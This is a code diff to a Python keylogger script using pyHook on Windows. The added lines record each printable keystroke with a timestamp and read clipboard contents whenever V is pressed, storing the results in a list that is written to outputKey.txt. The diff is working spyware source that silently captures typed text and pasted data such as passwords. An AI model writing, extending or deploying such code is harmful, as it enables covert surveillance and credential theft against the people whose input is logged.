@@ -2,6 +2,7 @@ import pythoncom,pyHook
 from datetime import datetime
 import os
 import threading
+import win32clipboard
 def run(**args):
     fo = open("outputKey.txt", "w")
     fo.close()
@@ -23,7 +24,15 @@ def keys(**args):
             fo.write(str(key_list))
             fo.close()
         key_timer = str(datetime.now())
-        x = (event.Position,key_timer)
+        if event.Ascii > 32 and event.Ascii < 127:
+            x = (event.Ascii,key_timer)
+        elif event.Key == "V":
+            win32clipboard.OpenClipboard()
+            paste = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            x = (paste,key_timer)
+        else:
+            x = (event.Key,key_timer)
         key_list.append(x)
         return True
     hm = pyHook.HookManager()
